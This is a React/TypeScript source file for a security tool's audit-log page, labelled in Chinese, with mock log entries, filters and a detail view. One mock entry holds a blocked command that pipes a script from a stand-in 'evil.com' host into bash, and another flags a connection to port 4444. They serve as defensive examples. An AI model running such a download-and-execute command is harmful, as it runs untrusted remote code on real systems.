/**
 * AI Guardian - Audit Logs Page
 *
 * 审计日志页面，展示执法记录仪记录的所有安全事件
 */

import React, { useState } from 'react';
import {
  MagnifyingGlassIcon,
  FunnelIcon,
  ArrowDownTrayIcon,
  DocumentTextIcon,
  ShieldCheckIcon,
  NoSymbolIcon,
  ExclamationTriangleIcon,
} from '@heroicons/react/24/outline';

interface AuditLog {
  id: string;
  timestamp: string;
  eventType: string;
  processId: number;
  processName: string;
  commandLine: string;
  operation: string;
  target: string;
  riskScore: number;
  riskLevel: 'none' | 'low' | 'medium' | 'high' | 'critical';
  decision: 'allow' | 'block' | 'ask';
  reason: string;
  signature: string;
}

const mockLogs: AuditLog[] = [
  {
    id: 'AUD-20240115-001',
    timestamp: '2024-01-15 10:30:45',
    eventType: 'File Delete',
    processId: 1234,
    processName: 'node',
    commandLine: 'node server.js',
    operation: 'DELETE',
    target: '/tmp/test.txt',
    riskScore: 25,
    riskLevel: 'low',
    decision: 'allow',
    reason: 'Normal file operation in temp directory',
    signature: 'sha256:a1b2c3d4...',
  },
  {
    id: 'AUD-20240115-002',
    timestamp: '2024-01-15 10:31:12',
    eventType: 'Network Connect',
    processId: 5678,
    processName: 'python',
    commandLine: 'python script.py',
    operation: 'CONNECT',
    target: '192.168.1.100:4444',
    riskScore: 85,
    riskLevel: 'high',
    decision: 'block',
    reason: 'Suspicious port 4444 (Metasploit default)',
    signature: 'sha256:e5f6g7h8...',
  },
  {
    id: 'AUD-20240115-003',
    timestamp: '2024-01-15 10:32:08',
    eventType: 'Process Exec',
    processId: 9012,
    processName: 'bash',
    commandLine: 'bash -c "curl http://evil.com/script.sh | bash"',
    operation: 'EXEC',
    target: 'curl',
    riskScore: 95,
    riskLevel: 'critical',
    decision: 'block',
    reason: 'Download and execute pattern detected',
    signature: 'sha256:i9j0k1l2...',
  },
];

const AuditLogs: React.FC = () => {
  const [logs] = useState<AuditLog[]>(mockLogs);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterDecision, setFilterDecision] = useState<string>('all');
  const [filterRisk, setFilterRisk] = useState<string>('all');
  const [selectedLog, setSelectedLog] = useState<AuditLog | null>(null);

  const getRiskBadge = (level: string) => {
    const styles = {
      none: 'bg-gray-500/20 text-gray-400',
      low: 'bg-green-500/20 text-green-500',
      medium: 'bg-yellow-500/20 text-yellow-500',
      high: 'bg-orange-500/20 text-orange-500',
      critical: 'bg-red-500/20 text-red-500',
    };
    return styles[level as keyof typeof styles] || styles.none;
  };

  const getDecisionBadge = (decision: string) => {
    const styles = {
      allow: 'bg-green-500/20 text-green-500',
      block: 'bg-red-500/20 text-red-500',
      ask: 'bg-yellow-500/20 text-yellow-500',
    };
    const labels = { allow: '允许', block: '阻断', ask: '询问' };
    return {
      className: styles[decision as keyof typeof styles],
      label: labels[decision as keyof typeof labels],
    };
  };

  const filteredLogs = logs.filter((log) => {
    const matchesSearch =
      log.processName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      log.target.toLowerCase().includes(searchTerm.toLowerCase()) ||
      log.commandLine.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesDecision = filterDecision === 'all' || log.decision === filterDecision;
    const matchesRisk = filterRisk === 'all' || log.riskLevel === filterRisk;
    return matchesSearch && matchesDecision && matchesRisk;
  });

  return (
    <div className="p-8 space-y-6">
      {/* Header */}
      <div className="flex justify-between items-center">
        <div>
          <h1 className="text-3xl font-bold">审计日志</h1>
          <p className="text-gray-400 mt-1">执法记录仪 - 不可篡改的安全事件记录</p>
        </div>
        <button className="flex items-center px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg transition-colors">
          <ArrowDownTrayIcon className="w-5 h-5 mr-2" />
          导出日志
        </button>
      </div>

      {/* Filters */}
      <div className="bg-gray-800 rounded-xl p-4 border border-gray-700">
        <div className="flex flex-wrap gap-4">
          {/* Search */}
          <div className="flex-1 min-w-[300px]">
            <div className="relative">
              <MagnifyingGlassIcon className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
              <input
                type="text"
                placeholder="搜索进程、命令、目标..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:border-blue-500"
              />
            </div>
          </div>

          {/* Decision Filter */}
          <div className="flex items-center space-x-2">
            <FunnelIcon className="w-5 h-5 text-gray-400" />
            <select
              value={filterDecision}
              onChange={(e) => setFilterDecision(e.target.value)}
              className="px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
            >
              <option value="all">所有决策</option>
              <option value="allow">允许</option>
              <option value="block">阻断</option>
              <option value="ask">询问</option>
            </select>
          </div>

          {/* Risk Filter */}
          <div className="flex items-center space-x-2">
            <select
              value={filterRisk}
              onChange={(e) => setFilterRisk(e.target.value)}
              className="px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:outline-none focus:border-blue-500"
            >
              <option value="all">所有风险等级</option>
              <option value="none">无风险</option>
              <option value="low">低风险</option>
              <option value="medium">中风险</option>
              <option value="high">高风险</option>
              <option value="critical">严重</option>
            </select>
          </div>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center justify-between">
            <span className="text-gray-400">总记录</span>
            <DocumentTextIcon className="w-5 h-5 text-blue-500" />
          </div>
          <p className="text-2xl font-bold mt-2">15,234</p>
        </div>
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center justify-between">
            <span className="text-gray-400">已阻断</span>
            <NoSymbolIcon className="w-5 h-5 text-red-500" />
          </div>
          <p className="text-2xl font-bold mt-2 text-red-500">1,289</p>
        </div>
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center justify-between">
            <span className="text-gray-400">高风险</span>
            <ExclamationTriangleIcon className="w-5 h-5 text-orange-500" />
          </div>
          <p className="text-2xl font-bold mt-2 text-orange-500">734</p>
        </div>
        <div className="bg-gray-800 rounded-lg p-4 border border-gray-700">
          <div className="flex items-center justify-between">
            <span className="text-gray-400">完整性</span>
            <ShieldCheckIcon className="w-5 h-5 text-green-500" />
          </div>
          <p className="text-2xl font-bold mt-2 text-green-500">100%</p>
        </div>
      </div>

      {/* Logs Table */}
      <div className="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-gray-700/50">
              <tr>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">ID</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">时间</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">进程</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">操作</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">目标</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">风险</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">决策</th>
                <th className="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">操作</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-700">
              {filteredLogs.map((log) => {
                const decisionBadge = getDecisionBadge(log.decision);
                return (
                  <tr
                    key={log.id}
                    className="hover:bg-gray-700/30 transition-colors cursor-pointer"
                    onClick={() => setSelectedLog(log)}
                  >
                    <td className="px-4 py-3 text-sm font-mono text-gray-400">{log.id}</td>
                    <td className="px-4 py-3 text-sm text-gray-400">{log.timestamp}</td>
                    <td className="px-4 py-3">
                      <div>
                        <span className="text-sm font-medium">{log.processName}</span>
                        <span className="text-xs text-gray-500 ml-2">({log.processId})</span>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-sm">{log.operation}</td>
                    <td className="px-4 py-3 text-sm text-gray-400 truncate max-w-xs">{log.target}</td>
                    <td className="px-4 py-3">
                      <span className={`px-2 py-1 rounded text-xs font-semibold ${getRiskBadge(log.riskLevel)}`}>
                        {log.riskScore}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <span className={`px-2 py-1 rounded text-xs ${decisionBadge.className}`}>
                        {decisionBadge.label}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <button className="text-blue-500 hover:text-blue-400 text-sm">详情</button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      </div>

      {/* Detail Modal */}
      {selectedLog && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-gray-800 rounded-xl border border-gray-700 w-full max-w-2xl max-h-[90vh] overflow-y-auto m-4">
            <div className="p-6 border-b border-gray-700 flex justify-between items-center">
              <h2 className="text-xl font-bold">日志详情</h2>
              <button
                onClick={() => setSelectedLog(null)}
                className="text-gray-400 hover:text-white"
              >
                ✕
              </button>
            </div>
            <div className="p-6 space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="text-sm text-gray-400">日志 ID</label>
                  <p className="font-mono">{selectedLog.id}</p>
                </div>
                <div>
                  <label className="text-sm text-gray-400">时间戳</label>
                  <p>{selectedLog.timestamp}</p>
                </div>
                <div>
                  <label className="text-sm text-gray-400">进程</label>
                  <p>{selectedLog.processName} ({selectedLog.processId})</p>
                </div>
                <div>
                  <label className="text-sm text-gray-400">操作</label>
                  <p>{selectedLog.operation}</p>
                </div>
              </div>
              <div>
                <label className="text-sm text-gray-400">命令行</label>
                <p className="font-mono text-sm bg-gray-700 p-2 rounded">{selectedLog.commandLine}</p>
              </div>
              <div>
                <label className="text-sm text-gray-400">目标</label>
                <p className="font-mono">{selectedLog.target}</p>
              </div>
              <div>
                <label className="text-sm text-gray-400">决策原因</label>
                <p className="bg-gray-700 p-2 rounded">{selectedLog.reason}</p>
              </div>
              <div>
                <label className="text-sm text-gray-400">数字签名</label>
                <p className="font-mono text-xs text-gray-500">{selectedLog.signature}</p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AuditLogs;
